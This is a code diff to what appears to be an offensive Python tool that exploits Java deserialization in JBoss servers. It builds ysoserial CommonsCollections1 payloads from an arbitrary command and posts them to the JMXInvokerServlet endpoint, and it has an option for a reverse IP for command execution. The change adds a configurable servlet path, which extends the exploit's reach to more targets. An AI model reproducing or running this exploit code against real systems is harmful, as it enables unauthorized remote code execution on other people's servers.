@@ -43,7 +43,7 @@ def execute(cmd):
 	os.system("java -jar ../ysoserial-0.0.2-all.jar CommonsCollections1 '%s' > _cmd_"%cmd)
 	data = open('./_cmd_', 'rb').read()
 	os.system("rm _cmd_")
-	res = requests.post(url='http://'+target_ip+':'+target_port+'/invoker/JMXInvokerServlet', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+	res = requests.post(url = 'http://' + target_ip + ':' + target_port + target_path, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
 
 # get cmd and exit
 def get_cmd():
@@ -76,6 +76,7 @@ parser = OptionParser(usage='%prog [options]', description='Serialized objects c
 parser.add_option('-t', '--target', type='string', dest="target", help='target ip')
 parser.add_option('-p', '--port', type='string', dest="port", help='target port')
 parser.add_option('-r', '--reverse', type='string', dest="reverse", help='cmd exec reverse ip (default my ip)')
+parser.add_option('--path', type='string', dest="path", default="/invoker/JMXInvokerServlet", help='servlet path (default /invoker/JMXInvokerServlet)')
 
 (options, args) = parser.parse_args()
 
@@ -92,6 +93,10 @@ else:
 
 target_ip = options.target
 target_port = options.port
+if options.path[0] != "/":
+	target_path = "/"+options.path
+else:
+	target_path = options.path
 
 if ValidIPAddress(target_ip):
 	MakeScript()
